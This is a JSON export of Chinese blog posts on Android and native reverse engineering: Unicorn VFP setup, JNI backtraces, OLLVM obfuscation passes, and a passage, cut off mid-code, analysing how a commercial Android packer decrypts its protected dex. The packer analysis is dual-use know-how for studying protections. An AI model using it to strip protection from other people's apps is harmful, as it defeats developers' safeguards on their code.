[{"title":"unicorn启用VFP","date":"2018-10-15T13:06:25.000Z","path":"2018/10/15/unicorn启用VFP/","text":"使用 unicorn 模拟 arm 指令执行时，有时会遇到一些浮点指令（VMOV、VPUSH等），默认情况下 unicorn 会报一个 UC_ERR_INSN_INVALID 错误。 通过以下代码可以开启VFP支持。 123456789101112131415161718192021222324252627err = uc_open(UC_ARCH_ARM, UC_MODE_ARM, &amp;uc);if (err) &#123; printf(\"uc_open %d\\n\", err); return 1;&#125;uint64_t tmp_val;err = uc_reg_read(uc, UC_ARM_REG_C1_C0_2, &amp;tmp_val);if (err) &#123; printf(\"uc_open %d\\n\", err); return 1;&#125;tmp_val = tmp_val | (0xf &lt;&lt; 20);err = uc_reg_write(uc, UC_ARM_REG_C1_C0_2, &amp;tmp_val);if (err) &#123; printf(\"uc_open %d\\n\", err); return 1;&#125;size_t enable_vfp = 0x40000000;err = uc_reg_write(uc, UC_ARM_REG_FPEXC, &amp;enable_vfp);if (err) &#123; printf(\"uc_open %d\\n\", err); return 1;&#125; 参考：arm_enable_vfp.c","tags":[]},{"title":"在JNI中打印调用栈","date":"2018-04-13T13:56:30.000Z","path":"2018/04/13/post/","text":"在网上搜索的Android打印调用栈，实现方式有以下三种： 使用CallStack类 使用_Unwind_Backtrace函数 自己编译 libunwind 第一种方法，在我的环境中（Android 5.1），可以在 libutils.so 找到相应的函数，可是并不能在 NDK中找到 utils/CallStack.h 这个头文件，所以得自己使用 dlsym 取得函数地址再调用，但是CallStack是一个 c++ 类，要调用比较麻烦，所以放弃这种方法。 第二种方法，这个就比较好了，能找到头文件，也能够成功编译，但是编译器将 libgcc.a 中的 _Unwind_Backtrace 函数跟我的动态库链接，这个实现似乎跟 Android 水土不服，获取的调用栈数量极少。 第三种，一看就很麻烦，放弃了。 本来呢，在第二种方法中，我希望的是使用 libunwind 的_Unwind_Backtrace 函数，然而看 libunwind 时发现，它并没有导出这个函数。不过意外的发现了 unw_backtrace 函数，从源码也能看出它具有跟 _Unwind_Backtrace 相同的功能，使用它的效果也是极好的，下面源码奉上： 1234567891011121314151617181920212223242526typedef int (*Unw_BackTrace_Func)(void**, int);void print_backtrace() &#123; static Unw_BackTrace_Func unw_backtrace = NULL; if (!unw_backtrace) &#123; void *hanle = dlopen(\"libunwind.so\", RTLD_NOW); unw_backtrace = (Unw_BackTrace_Func)dlsym(hanle, \"unw_backtrace\"); &#125; void *buffer[32] = &#123; 0 &#125;; int n = unw_backtrace((void**)&amp;buffer, 32); for(int i = 1; i &lt; n; i++) &#123; const char *file = \"\\t\\t\\t\\t\"; const char *symbol = \"\\t\\t\\t\\t\"; Dl_info info; if (dladdr(buffer[i], &amp;info)) &#123; if (info.dli_sname) &#123; symbol = info.dli_sname; &#125; if (info.dli_fname) &#123; file = info.dli_fname; &#125; &#125; LOGI(\"#%02d: %p \\t %s \\t %s\", i, buffer[i], symbol, file); &#125;&#125; 一些参考： Android 平台 Native 代码的崩溃捕获机制及实现 JNI中如何打印Call Stack Android下打印调试堆栈方法","tags":[{"name":"Android","slug":"Android","permalink":"http://www.ench4nt3r.com/tags/Android/"}]},{"title":"ollvm源码分析","date":"2018-02-26T05:23:39.000Z","path":"2018/02/26/post/","text":"分割基本块-mllvm -split: activates basic block splitting. Improve the flattening when applied together. -mllvm -split_num=3: if the pass is activated, applies it 3 times on each basic block. Default: 1 ollvm的每个混淆pass都是继承FunctionPass，所以他们的入口函数都是runOnFunction。 bool SplitBasicBlock::runOnFunction(Function &amp;F) { if (!((SplitNum &gt; 1) &amp;&amp; (SplitNum &lt;= 10))) { return false; } Function *tmp = &amp;F; if (toObfuscate(flag, tmp, &quot;split&quot;)) { split(tmp); ++Split; } return false; } toObfuscate函数通过查找Functions annotations和flag来判断是否启用了split。 void SplitBasicBlock::split(Function *f) { std::vector&lt;BasicBlock *&gt; origBB; int splitN = SplitNum; // Save all basic blocks for (Function::iterator I = f-&gt;begin(), IE = f-&gt;end(); I != IE; ++I) { origBB.push_back(&amp;*I); } 首先保存所有的基本块。 for (std::vector&lt;BasicBlock *&gt;::iterator I = origBB.begin(), IE = origBB.end(); I != IE; ++I) { BasicBlock *curr = *I; // No need to split a 1 inst bb // Or ones containing a PHI node if (curr-&gt;size() &lt; 2 || containsPHI(curr)) { continue; } // Check splitN and current BB size if ((size_t)splitN &gt; curr-&gt;size()) { splitN = curr-&gt;size() - 1; } 接着遍历所有基本块。如果基本块只有一条指令或者包含PHI结点的，不分割该基本块。 // Generate splits point std::vector&lt;int&gt; test; for (unsigned i = 1; i &lt; curr-&gt;size(); ++i) { test.push_back(i); } // Shuffle if (test.size() != 1) { shuffle(test); std::sort(test.begin(), test.begin() + splitN); } 生成基本块的分割点。 // Split BasicBlock::iterator it = curr-&gt;begin(); BasicBlock *toSplit = curr; int last = 0; for (int i = 0; i &lt; splitN; ++i) { for (int j = 0; j &lt; test[i] - last; ++j) { ++it; } last = test[i]; if(toSplit-&gt;size() &lt; 2) continue; toSplit = toSplit-&gt;splitBasicBlock(it, toSplit-&gt;getName() + &quot;.split&quot;); } ++Split; } 最后调用splitBasicBlock分割基本块。 控制流平坦化-mllvm -fla: activates control flow flattening 入口函数仍然是runOnFunction： bool Flattening::runOnFunction(Function &amp;F) { Function *tmp = &amp;F; // Do we obfuscate if (toObfuscate(flag, tmp, &quot;fla&quot;)) { if (flatten(tmp)) { ++Flattened; } } return false; } bool Flattening::flatten(Function *f) { vector&lt;BasicBlock *&gt; origBB; BasicBlock *loopEntry; BasicBlock *loopEnd; LoadInst *load; SwitchInst *switchI; AllocaInst *switchVar; // SCRAMBLER char scrambling_key[16]; llvm::cryptoutils-&gt;get_bytes(scrambling_key, 16); // END OF SCRAMBLER // Lower switch FunctionPass *lower = createLowerSwitchPass(); lower-&gt;runOnFunction(*f); 在函数开始，使用LowerSwitchPass去除switch，将switch结构换成if结构。 // Nothing to flatten if (origBB.size() &lt;= 1) { return false; } 只有一个基本块的函数将不处理。 // Get a pointer on the first BB Function::iterator tmp = f-&gt;begin(); //++tmp; BasicBlock *insert = &amp;*tmp; // If main begin with an if BranchInst *br = NULL; if (isa&lt;BranchInst&gt;(insert-&gt;getTerminator())) { br = cast&lt;BranchInst&gt;(insert-&gt;getTerminator()); } if ((br != NULL &amp;&amp; br-&gt;isConditional()) || insert-&gt;getTerminator()-&gt;getNumSuccessors() &gt; 1) { BasicBlock::iterator i = insert-&gt;end(); --i; if (insert-&gt;size() &gt; 1) { --i; } BasicBlock *tmpBB = insert-&gt;splitBasicBlock(i, &quot;first&quot;); origBB.insert(origBB.begin(), tmpBB); } // Remove jump insert-&gt;getTerminator()-&gt;eraseFromParent(); 如果第一个基本块的末尾是有条件的跳转指令，那么需要将它分割开，并且将它保存到origBB（这个数组包含着所有的基本块，除了函数的第一个基本块）。 // Create switch variable and set as it switchVar = new AllocaInst(Type::getInt32Ty(f-&gt;getContext()), 0, &quot;switchVar&quot;, insert); new StoreInst( ConstantInt::get(Type::getInt32Ty(f-&gt;getContext()), llvm::cryptoutils-&gt;scramble32(0, scrambling_key)), switchVar, insert); 创建switch变量并且初始化。 // Create main loop loopEntry = BasicBlock::Create(f-&gt;getContext(), &quot;loopEntry&quot;, f, insert); loopEnd = BasicBlock::Create(f-&gt;getContext(), &quot;loopEnd&quot;, f, insert); load = new LoadInst(switchVar, &quot;switchVar&quot;, loopEntry); // Move first BB on top insert-&gt;moveBefore(loopEntry); BranchInst::Create(loopEntry, insert); // loopEnd jump to loopEntry BranchInst::Create(loopEntry, loopEnd); BasicBlock *swDefault = BasicBlock::Create(f-&gt;getContext(), &quot;switchDefault&quot;, f, loopEnd); BranchInst::Create(loopEnd, swDefault); // Create switch instruction itself and set condition switchI = SwitchInst::Create(&amp;*f-&gt;begin(), swDefault, 0, loopEntry); switchI-&gt;setCondition(load); 创建两个基本块，存放循环头和尾的指令。然后将first bb移到到loopEntry的前面，并且创建一条跳转指令，从first bb跳到loopEntry。紧接着创建了一条从loopEnd跳到loopEntry的指令。最后，创建了switch指令和switch default块，并且创建相应的跳转。现在有了大概如下的结构： +--------+ |first bb| +---+----+ | +----v----+ |loopEntry| &lt;--------+ +----+----+ | | | +----v---+ | | switch | | +----+---+ | | | +--------------+ | | | +------v-------+ | | default case | | +------+-------+ | | | +-------------+ | | | | | v | +-----+------+ | | loopEnd +---------+ +------------+ // Remove branch jump from 1st BB and make a jump to the while f-&gt;begin()-&gt;getTerminator()-&gt;eraseFromParent(); BranchInst::Create(loopEntry, &amp;*f-&gt;begin()); 删除first bb的跳转指令，改为跳转到loopEntry // Put all BB in the switch for (vector&lt;BasicBlock *&gt;::iterator b = origBB.begin(); b != origBB.end(); ++b) { BasicBlock *i = *b; ConstantInt *numCase = NULL; // Move the BB inside the switch (only visual, no code logic) i-&gt;moveBefore(loopEnd); // Add case to switch numCase = cast&lt;ConstantInt&gt;(ConstantInt::get( switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32(switchI-&gt;getNumCases(), scrambling_key))); switchI-&gt;addCase(numCase, i); } 将所有的基本块加入switch结构 // Recalculate switchVar for (vector&lt;BasicBlock *&gt;::iterator b = origBB.begin(); b != origBB.end(); ++b) { BasicBlock *i = *b; ConstantInt *numCase = NULL; // Ret BB if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 0) { continue; } // If it&apos;s a non-conditional jump if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 1) { // Get successor and delete terminator BasicBlock *succ = i-&gt;getTerminator()-&gt;getSuccessor(0); i-&gt;getTerminator()-&gt;eraseFromParent(); // Get next case numCase = switchI-&gt;findCaseDest(succ); // If next case == default case (switchDefault) if (numCase == NULL) { numCase = cast&lt;ConstantInt&gt;( ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32( switchI-&gt;getNumCases() - 1, scrambling_key))); } // Update switchVar and jump to the end of loop new StoreInst(numCase, load-&gt;getPointerOperand(), i); BranchInst::Create(loopEnd, i); continue; } 接下来是根据原先的跳转来计算switch变量。对于没有后继（return BB）的基本块，直接跳过。对于只有一个后继的基本块，首先删除跳转指令，并且通过后继基本块来搜索对应的switch case，根据case创建一条存储指令，达到跳转的目的。 // If it&apos;s a conditional jump if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 2) { // Get next cases ConstantInt *numCaseTrue = switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(0)); ConstantInt *numCaseFalse = switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(1)); // Check if next case == default case (switchDefault) if (numCaseTrue == NULL) { numCaseTrue = cast&lt;ConstantInt&gt;( ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32( switchI-&gt;getNumCases() - 1, scrambling_key))); } if (numCaseFalse == NULL) { numCaseFalse = cast&lt;ConstantInt&gt;( ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32( switchI-&gt;getNumCases() - 1, scrambling_key))); } // Create a SelectInst BranchInst *br = cast&lt;BranchInst&gt;(i-&gt;getTerminator()); SelectInst *sel = SelectInst::Create(br-&gt;getCondition(), numCaseTrue, numCaseFalse, &quot;&quot;, i-&gt;getTerminator()); // Erase terminator i-&gt;getTerminator()-&gt;eraseFromParent(); // Update switchVar and jump to the end of loop new StoreInst(sel, load-&gt;getPointerOperand(), i); BranchInst::Create(loopEnd, i); continue; } } 两个后继的情况跟一个后继的处理方法相似，不同的是，创建一条select指令，根据条件的结果来选择分支。 虚假控制流-mllvm -bcf: activates the bogus control flow pass -mllvm -bcf_loop=3: if the pass is activated, applies it 3 times on a function. Default: 1 -mllvm -bcf_prob=40: if the pass is activated, a basic bloc will be obfuscated with a probability of 40%. Default: 30 void bogus(Function &amp;F) { ... int NumObfTimes = ObfTimes; // Real begining of the pass // Loop for the number of time we run the pass on the function do{ DEBUG_WITH_TYPE(&quot;cfg&quot;, errs() &lt;&lt; &quot;bcf: Function &quot; &lt;&lt; F.getName() &lt;&lt;&quot;, before the pass:\\n&quot;); DEBUG_WITH_TYPE(&quot;cfg&quot;, F.viewCFG()); // Put all the function&apos;s block in a list std::list&lt;BasicBlock *&gt; basicBlocks; for (Function::iterator i=F.begin();i!=F.end();++i) { basicBlocks.push_back(&amp;*i); } do循环的条件表达式是--NumObfTimes &gt; 0，NumObfTimes关联着-bcf_loop选项的值。首先，还是保存基本块。 while(!basicBlocks.empty()){ NumBasicBlocks ++; // Basic Blocks&apos; selection if((int)llvm::cryptoutils-&gt;get_range(100) &lt;= ObfProbRate){ DEBUG_WITH_TYPE(&quot;opt&quot;, errs() &lt;&lt; &quot;bcf: Block &quot; &lt;&lt; NumBasicBlocks &lt;&lt;&quot; selected. \\n&quot;); hasBeenModified = true; ++NumModifiedBasicBlocks; NumAddedBasicBlocks += 3; FinalNumBasicBlocks += 3; // Add bogus flow to the given Basic Block (see description) BasicBlock *basicBlock = basicBlocks.front(); addBogusFlow(basicBlock, F); } else{ DEBUG_WITH_TYPE(&quot;opt&quot;, errs() &lt;&lt; &quot;bcf: Block &quot; &lt;&lt; NumBasicBlocks &lt;&lt;&quot; not selected.\\n&quot;); } // remove the block from the list basicBlocks.pop_front(); if(firstTime){ // first time we iterate on this function ++InitNumBasicBlocks; ++FinalNumBasicBlocks; } } // end of while(!basicBlocks.empty()) .... }while(--NumObfTimes &gt; 0); } 遍历基本块，随机决定当前基本块是否需要修改，ObfProbRate变量关联着-bcf_prob选项的值。如果命中，则调用addBogusFlow函数。 virtual void addBogusFlow(BasicBlock * basicBlock, Function &amp;F){ ... BasicBlock::iterator i1 = basicBlock-&gt;begin(); if(basicBlock-&gt;getFirstNonPHIOrDbgOrLifetime()) i1 = (BasicBlock::iterator)basicBlock-&gt;getFirstNonPHIOrDbgOrLifetime(); Twine *var; var = new Twine(&quot;originalBB&quot;); BasicBlock *originalBB = basicBlock-&gt;splitBasicBlock(i1, *var); 在addBogusFlow函数中，首先基本块分为两部分，第一部分只包含PHI结点、调试信息、lifttime，第二部分包含着剩余的指令。 Twine * var3 = new Twine(&quot;alteredBB&quot;); BasicBlock *alteredBB = createAlteredBasicBlock(originalBB, *var3, &amp;F); 接着，由createAlteredBasicBlock函数复制基本块，并增加一些花指令。 Twine * var4 = new Twine(&quot;condition&quot;); FCmpInst * condition = new FCmpInst(*basicBlock, FCmpInst::FCMP_TRUE , LHS, RHS, *var4); BranchInst::Create(originalBB, alteredBB, (Value *)condition, basicBlock); BranchInst::Create(originalBB, alteredBB); 现在，我们有三个基本块，第一个是basicBlock，addBogusFlow函数的参数，第二个是originalBB，由basicBlock分割出来，第三个是alteredBB，由createAlteredBasicBlock创建的混淆块，然后将主要是将这三个块拼接起来： BasicBlock::iterator i = originalBB-&gt;end(); Twine * var5 = new Twine(&quot;originalBBpart2&quot;); BasicBlock * originalBBpart2 = originalBB-&gt;splitBasicBlock(--i , *var5); originalBB-&gt;getTerminator()-&gt;eraseFromParent(); Twine * var6 = new Twine(&quot;condition2&quot;); FCmpInst * condition2 = new FCmpInst(*originalBB, CmpInst::FCMP_TRUE , LHS, RHS, *var6); BranchInst::Create(originalBBpart2, alteredBB, (Value *)condition2, originalBB); 在addBogusFlow函数的最后，将originalBB的最后一条语句分割出来，然后拼接： addBogusFlow和bogus函数执行完成后，回到runOnFunction，接着执行doF函数 bool doF(Module &amp;M){ Twine * varX = new Twine(&quot;x&quot;); Twine * varY = new Twine(&quot;y&quot;); Value * x1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false); Value * y1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false); GlobalVariable * x = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false, GlobalValue::CommonLinkage, (Constant * )x1, *varX); GlobalVariable * y = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false, GlobalValue::CommonLinkage, (Constant * )y1, *varY); 首先，创建了两个全局变量。 for(Module::iterator mi = M.begin(), me = M.end(); mi != me; ++mi){ for(Function::iterator fi = mi-&gt;begin(), fe = mi-&gt;end(); fi != fe; ++fi){ TerminatorInst * tbb= fi-&gt;getTerminator(); if(tbb-&gt;getOpcode() == Instruction::Br){ BranchInst * br = (BranchInst *)(tbb); if(br-&gt;isConditional()){ FCmpInst * cond = (FCmpInst *)br-&gt;getCondition(); unsigned opcode = cond-&gt;getOpcode(); if(opcode == Instruction::FCmp){ if (cond-&gt;getPredicate() == FCmpInst::FCMP_TRUE){ toDelete.push_back(cond); // The condition toEdit.push_back(tbb); // The branch using the condition } } } } } } 紧接着，遍历模块的所有基本块，搜索出条件永远为true的比较语句。 for(std::vector&lt;Instruction*&gt;::iterator i =toEdit.begin();i!=toEdit.end();++i){ opX = new LoadInst ((Value *)x, &quot;&quot;, (*i)); opY = new LoadInst ((Value *)y, &quot;&quot;, (*i)); op = BinaryOperator::Create(Instruction::Sub, (Value *)opX, ConstantInt::get(Type::getInt32Ty(M.getContext()), 1, false), &quot;&quot;, (*i)); op1 = BinaryOperator::Create(Instruction::Mul, (Value *)opX, op, &quot;&quot;, (*i)); op = BinaryOperator::Create(Instruction::URem, op1, ConstantInt::get(Type::getInt32Ty(M.getContext()), 2, false), &quot;&quot;, (*i)); condition = new ICmpInst((*i), ICmpInst::ICMP_EQ, op, ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false)); condition2 = new ICmpInst((*i), ICmpInst::ICMP_SLT, opY, ConstantInt::get(Type::getInt32Ty(M.getContext()), 10, false)); op1 = BinaryOperator::Create(Instruction::Or, (Value *)condition, (Value *)condition2, &quot;&quot;, (*i)); BranchInst::Create(((BranchInst*)*i)-&gt;getSuccessor(0), ((BranchInst*)*i)-&gt;getSuccessor(1),(Value *) op1, ((BranchInst*)*i)-&gt;getParent()); DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Erase branch instruction:&quot; &lt;&lt; *((BranchInst*)*i) &lt;&lt; &quot;\\n&quot;); (*i)-&gt;eraseFromParent(); // erase the branch } 在最后，用表达式(x - 1) * x % 2 == 0 || y &lt; 0替换永远为true的比较语句。从上面可以看出，doF函数将所有永远为true的比较语句替换为(x - 1) * x % 2 == 0 || y &lt; 0，并且，这个表达式的结果也永远为true 指令替换-mllvm -sub: activate instructions substitution -mllvm -sub_loop=3: if the pass is activated, applies it 3 times on a function. Default : 1. bool Substitution::substitute(Function *f) { Function *tmp = f; int times = ObfTimes; do { for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { if (inst-&gt;isBinaryOp()) { switch (inst-&gt;getOpcode()) { case Instruction::Add: (this-&gt;*funcAdd[llvm::cryptoutils-&gt;get_range(NUMBER_ADD_SUBST)])( cast&lt;BinaryOperator&gt;(inst)); break; case BinaryOperator::Sub: (this-&gt;*funcSub[llvm::cryptoutils-&gt;get_range(NUMBER_SUB_SUBST)])( cast&lt;BinaryOperator&gt;(inst)); break; case Instruction::And: (this-&gt;*funcAnd[llvm::cryptoutils-&gt;get_range(2)])(cast&lt;BinaryOperator&gt;(inst)); break; case Instruction::Or: (this-&gt;*funcOr[llvm::cryptoutils-&gt;get_range(2)])(cast&lt;BinaryOperator&gt;(inst)); break; case Instruction::Xor: (this-&gt;*funcXor[llvm::cryptoutils-&gt;get_range(2)])(cast&lt;BinaryOperator&gt;(inst)); break; } // End switch } // End isBinaryOp } // End for basickblock } // End for Function } while (--times &gt; 0); // for times return false; } 从源码可以看出，ollvm只对加、减、或、与、异或这五种操作进行替换，funcXXX变量都是函数数组，随机的选择一种变换进行操作。ObfTimes关联-sub_loop。 // a = b - (-c) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); bo-&gt;replaceAllUsesWith(op); // a = -(-b + (-c)) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(0), &quot;&quot;, bo); op2 = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); op = BinaryOperator::Create(Instruction::Add, op, op2, &quot;&quot;, bo); op = BinaryOperator::CreateNeg(op, &quot;&quot;, bo); bo-&gt;replaceAllUsesWith(op); // r = rand (); a = b + r; a = a + c; a = a - r Type *ty = bo-&gt;getType(); ConstantInt *co = (ConstantInt *)ConstantInt::get(ty, llvm::cryptoutils-&gt;get_uint64_t()); op = BinaryOperator::Create(Instruction::Add, bo-&gt;getOperand(0), co, &quot;&quot;, bo); op = BinaryOperator::Create(Instruction::Add, op, bo-&gt;getOperand(1), &quot;&quot;, bo); op = BinaryOperator::Create(Instruction::Sub, op, co, &quot;&quot;, bo); bo-&gt;replaceAllUsesWith(op); // r = rand (); a = b - r; a = a + b; a = a + r Type *ty = bo-&gt;getType(); ConstantInt *co = (ConstantInt *)ConstantInt::get(ty, llvm::cryptoutils-&gt;get_uint64_t()); op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), co, &quot;&quot;, bo); op = BinaryOperator::Create(Instruction::Add, op, bo-&gt;getOperand(1), &quot;&quot;, bo); op = BinaryOperator::Create(Instruction::Add, op, co, &quot;&quot;, bo); bo-&gt;replaceAllUsesWith(op); 上面对应着funcAdd数组的四种替换方法。第一种，将第二个操作数取反，然后改写成减法指令。第二种，将两个操作数都取反，结果相加之后再次取反。第三种，取一个随机数，将随机数与操作数1相加，然后将结果与操作数2相加，最后减去随机数。第四种，取一个随机数，将操作数1减去随机数，然后将结果与操作数2相加，最后加上随机数。 指令替换的过程都比较简单，也就不再介绍其他的替换方法了，具体可以参考官网：Instructions Substitution。 字符串加密“字符串加密”这个功能不是ollvm的，而是”孤挺花“这个项目的，不过它是基于ollvm的，所以也分析看看。 与上面的pass不同，字符串加密的pass是继承ModulePass的，所以它的入口函数是runOnModule。 virtual bool runOnModule(Module &amp;M) { std::vector&lt;GlobalVariable*&gt; toDelConstGlob; std::vector&lt;encVar*&gt; encGlob; for (Module::global_iterator gi = M.global_begin(), ge = M.global_end(); gi != ge; ++gi) { GlobalVariable* gv = &amp;(*gi); std::string::size_type str_idx = gv-&gt;getName().str().find(&quot;.str.&quot;); std::string section(gv-&gt;getSection()); if (gv-&gt;isConstant() &amp;&amp; gv-&gt;hasInitializer() &amp;&amp; isa&lt;ConstantDataSequential&gt;(gv-&gt;getInitializer()) &amp;&amp; section != &quot;llvm.metadata&quot; &amp;&amp; section.find(&quot;__objc_methname&quot;) == std::string::npos) { 首先遍历模块的所有全局变量，只有这个变量为常量，并且已经初始化的，才进行下一步操作。 GlobalVariable *dynGV = new GlobalVariable(M, gv-&gt;getType()-&gt;getElementType(), !(gv-&gt;isConstant()), gv-&gt;getLinkage(), (Constant*) 0, gv-&gt;getName(), (GlobalVariable*) 0, gv-&gt;getThreadLocalMode(), gv-&gt;getType()-&gt;getAddressSpace()); dynGV-&gt;setInitializer(gv-&gt;getInitializer()); Constant *initializer = gv-&gt;getInitializer(); ConstantDataSequential *cdata = dyn_cast&lt;ConstantDataSequential&gt;(initializer); if (cdata) { const char *orig = cdata-&gt;getRawDataValues().data(); unsigned int len = cdata-&gt;getNumElements()*cdata-&gt;getElementByteSize(); encVar *cur = new encVar(); cur-&gt;var = dynGV; cur-&gt;key = llvm::cryptoutils-&gt;get_uint8_t(); char *encr = (char*)orig; for (unsigned i = 0; i != len; ++i) { encr[i] = orig[i]^cur-&gt;key; } dynGV-&gt;setInitializer(initializer); encGlob.push_back(cur); } else { dynGV-&gt;setInitializer(initializer); } gv-&gt;replaceAllUsesWith(dynGV); toDelConstGlob.push_back(gv); } } 然后，创建一个全局变量，并且取得一个随机数，将随机数作为key与原先原先全局变量的值进行异或，最后，将结果设为新全局变量的值。 for (unsigned i = 0, e = toDelConstGlob.size(); i != e; ++i) toDelConstGlob[i]-&gt;eraseFromParent(); addDecodeFunction(&amp;M, &amp;encGlob); return true; 在这个函数的末尾，删除原先的全局变量，然后调用addDecodeFunction函数，增加一个解密函数。 void addDecodeFunction(Module *mod, std::vector&lt;encVar*&gt; *gvars) { std::vector&lt;Type*&gt;FuncTy_args; FunctionType* FuncTy = FunctionType::get( Type::getVoidTy(mod-&gt;getContext()), // returning void FuncTy_args, // taking no args false); uint64_t StringObfDecodeRandomName = cryptoutils-&gt;get_uint64_t(); std::string random_str; std::strstream random_stream; random_stream &lt;&lt; StringObfDecodeRandomName; random_stream &gt;&gt; random_str; StringObfDecodeRandomName++; Constant* c = mod-&gt;getOrInsertFunction(&quot;.datadiv_decode&quot; + random_str, FuncTy); Function* fdecode = cast&lt;Function&gt;(c); fdecode-&gt;setCallingConv(CallingConv::C); ConstantInt* const_0 = ConstantInt::get(mod-&gt;getContext(), APInt(32, 0)); ConstantInt* const_1 = ConstantInt::get(mod-&gt;getContext(), APInt(32, 1)); BasicBlock* label_entry = BasicBlock::Create(mod-&gt;getContext(), &quot;entry&quot;, fdecode); 开始，创建一个函数声明: void .datadiv_decodexxx()，生成了两个常量和一个基本块，这个基本块作为函数的头 for (unsigned i = 0, e = gvars-&gt;size(); i != e; ++i) { GlobalVariable *gvar = (*gvars)[i]-&gt;var; char key = (*gvars)[i]-&gt;key; Constant *init = gvar-&gt;getInitializer(); ConstantDataSequential *cdata = dyn_cast&lt;ConstantDataSequential&gt;(init); unsigned len = cdata-&gt;getNumElements()*cdata-&gt;getElementByteSize(); ConstantInt* const_len = ConstantInt::get(mod-&gt;getContext(), APInt(32, len)); BasicBlock* label_for_body = BasicBlock::Create(mod-&gt;getContext(), &quot;for.body&quot;, fdecode, 0); BasicBlock* label_for_end = BasicBlock::Create(mod-&gt;getContext(), &quot;for.end&quot;, fdecode, 0); 在循环里面，创建了两个基本块，分别作为解密循环的body和end，并且计算出了当前key的长度 ICmpInst* cmp = new ICmpInst(*label_entry, ICmpInst::ICMP_EQ, const_len, const_0, &quot;cmp&quot;); BranchInst::Create(label_for_end, label_for_body, cmp, label_entry); 在这里，插入了第一条比较指令，条件表达式是：key的长度 == 0，如果为0则跳出循环，否则开始执行循环 Argument* fwdref_18 = new Argument(IntegerType::get(mod-&gt;getContext(), 32)); PHINode* int32_i = PHINode::Create(IntegerType::get(mod-&gt;getContext(), 32), 2, &quot;i.09&quot;, label_for_body); int32_i-&gt;addIncoming(fwdref_18, label_for_body); int32_i-&gt;addIncoming(const_0, label_entry); 在解密循环的body里面，创建了一个PHI结点，数据源分别是0和解密循环自增变量 std::vector&lt;Value*&gt; ptr_32_indices; ptr_32_indices.push_back(const_0); ptr_32_indices.push_back(int64_idxprom); ArrayRef&lt;Value*&gt; ref_ptr_32_indices = ArrayRef&lt;Value*&gt;(ptr_32_indices); Instruction* ptr_arrayidx = GetElementPtrInst::Create(NULL, gvar, ref_ptr_32_indices, &quot;arrayidx&quot;, label_for_body); LoadInst* int8_20 = new LoadInst(ptr_arrayidx, &quot;&quot;, false, label_for_body); int8_20-&gt;setAlignment(1); 这里生成的指令作用是：使用解密循环自增变量作为数组索引，从加密后的字符串里面读取一个字节 ConstantInt* const_key = ConstantInt::get(mod-&gt;getContext(), APInt(8, key)); BinaryOperator* int8_dec = BinaryOperator::Create(Instruction::Xor, int8_20, const_key, &quot;xor&quot;, label_for_body); StoreInst* void_21 = new StoreInst(int8_dec, ptr_arrayidx, false, label_for_body); void_21-&gt;setAlignment(1); 生成一条异或指令，将key和数据进行异或，得到原数据，最后将它写回。 BinaryOperator* int32_inc = BinaryOperator::Create(Instruction::Add, int32_i, const_1, &quot;inc&quot;, label_for_body); ICmpInst* int1_cmp = new ICmpInst(*label_for_body, ICmpInst::ICMP_EQ, int32_inc, const_len, &quot;cmp&quot;); BranchInst::Create(label_for_end, label_for_body, int1_cmp, label_for_body); fwdref_18-&gt;replaceAllUsesWith(int32_inc); delete fwdref_18; label_entry = label_for_end; } ReturnInst::Create(mod-&gt;getContext(), label_entry); 在最后，将解密循环自增变量自增，并且创建比较指令，当解密没完成时回到循环体继续解密。在接下来的代码，主要是获取llvm的全局变量llvm.global_ctors，然后将这个解密函数插入global_ctors，达到在运行时解密的功能。","tags":[{"name":"ollvm","slug":"ollvm","permalink":"http://www.ench4nt3r.com/tags/ollvm/"}]},{"title":"数字加固分析","date":"2018-02-10T03:37:05.000Z","path":"2018/02/10/post/","text":"Dex解密加密后的Dex数据被放在壳classes.dex的末尾。格式如下： struct info { byte unknow[4]; int file_len; // 不包含头8个字节 int unknow_data_len; byte *unknow_data; int dex_number; // 下面数组的数量 struct { int full_size; // data_size + 4 int data_size; byte *data; } dex[1]; }; 解密dex需要两步，第一步是将数据解密，得到一个用lzma压缩的数据，解压后，得到一个加密后的dex数据。第二步就是将加密的dex数据解密。两步解密都各需要一个key。key的计算跟info.unknow_data有关，模拟函数sub_E153C828（该函数在libjiagu.so释放的另外一个so内，下面的函数凡是以sub_E15开头的，都是在释放的so内）执行得到两个key。 sub_E153C828(info.unknow_data, info.unknow_data_len, &amp;key1, &amp;key2); 第一步解密：key1需要再次计算： // sub_E159CE08(&amp;key3, &amp;key1, 16) int sub_E159CE08(_BYTE *a1, int a2, int a3) { _BYTE *v3; // r4 signed int v4; // r5 int v5; // r6 unsigned int v6; // r7 int v7; // r0 char **v8; // r1 _BYTE *v9; // r0 int v10; // r2 int result; // r0 int v12; // [sp+8h] [bp-124h] int a2a; // [sp+Ch] [bp-120h] int v14; // [sp+10h] [bp-11Ch] int *v15; // [sp+14h] [bp-118h] a2a = a3; v12 = a2; v3 = a1; v4 = 256; v5 = 0; memset_0(); v6 = 0; do { v3[v6] = v6; v7 = mod(v6, a2a); v8 = (char **)&amp;v15; *((_BYTE 